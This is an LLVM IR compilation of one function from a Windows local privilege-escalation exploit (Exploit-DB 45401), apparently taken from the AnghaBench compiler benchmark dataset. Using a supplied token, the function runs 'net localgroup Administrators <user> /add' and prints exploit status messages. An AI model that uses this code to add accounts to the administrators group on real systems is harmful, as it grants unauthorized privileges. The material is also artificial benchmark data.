; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_45401.c_AddAccountToAdminGroup.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_45401.c_AddAccountToAdminGroup.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { i32 }

@MAX_PATH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"\0A[-] Failed to obtain current username: %d\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [72 x i8] c"\0A[*] Adding current user '%s' account to the local administrators group\00", align 1
@.str.2 = private unnamed_addr constant [38 x i8] c"net localgroup Administrators %s /add\00", align 1
@FALSE = common dso_local global i32 0, align 4
@CREATE_NEW_CONSOLE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [56 x i8] c"\0A[-] Failed to execute command (%d) Run exploit again\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"\0A[+] Executed command successfully\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @AddAccountToAdminGroup(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.TYPE_6__, align 4
  %5 = alloca %struct.TYPE_6__, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %11 = load i32, i32* @MAX_PATH, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %8, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %9, align 8
  %15 = call i32 @ZeroMemory(%struct.TYPE_6__* %4, i32 4)
  %16 = call i32 @ZeroMemory(%struct.TYPE_6__* %5, i32 4)
  %17 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %4, i32 0, i32 0
  store i32 4, i32* %17, align 4
  store i32 100, i32* %6, align 4
  %18 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %19 = call i32 @GetUserName(i8* %18, i32* %6)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %24, label %21

21:                                               ; preds = %1
  %22 = call i32 (...) @GetLastError()
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i32 %22)
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %10, align 4
  br label %39

24:                                               ; preds = %1
  %25 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.1, i64 0, i64 0), i8* %25)
  %27 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %28 = call i32 @sprintf(i8* %14, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0), i8* %27)
  %29 = load i32, i32* %3, align 4
  %30 = load i32, i32* @FALSE, align 4
  %31 = load i32, i32* @CREATE_NEW_CONSOLE, align 4
  %32 = call i32 @CreateProcessAsUser(i32 %29, i32* null, i8* %14, i32* null, i32* null, i32 %30, i32 %31, i32* null, i32* null, %struct.TYPE_6__* %4, %struct.TYPE_6__* %5)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %37, label %34

34:                                               ; preds = %24
  %35 = call i32 (...) @GetLastError()
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.3, i64 0, i64 0), i32 %35)
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %10, align 4
  br label %39

37:                                               ; preds = %24
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  store i32 1, i32* %10, align 4
  br label %39

39:                                               ; preds = %37, %34, %21
  %40 = load i8*, i8** %8, align 8
  call void @llvm.stackrestore(i8* %40)
  %41 = load i32, i32* %2, align 4
  ret i32 %41
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @ZeroMemory(%struct.TYPE_6__*, i32) #2

declare dso_local i32 @GetUserName(i8*, i32*) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @GetLastError(...) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @CreateProcessAsUser(i32, i32*, i8*, i32*, i32*, i32, i32, i32*, i32*, %struct.TYPE_6__*, %struct.TYPE_6__*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
